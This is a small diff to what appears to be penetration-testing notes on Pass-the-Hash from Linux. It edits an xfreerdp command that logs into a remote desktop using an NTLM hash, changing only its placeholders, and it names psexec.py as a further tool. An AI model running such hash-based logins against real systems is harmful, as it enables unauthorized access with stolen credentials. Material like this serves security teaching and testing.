@@ -88,7 +88,7 @@ Several tools exists in Linux, with built-in support to perform PtH. The followi
 {% embed url="https://www.kali.org/blog/passing-hash-remote-desktop/" %}
 
 ```sh
-$ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+$ xfreerdp /v:<target_ip> /u:DOMAIN\\<username> /pth:NTLM_HASH
 ```
 
 2. `psexec.py`
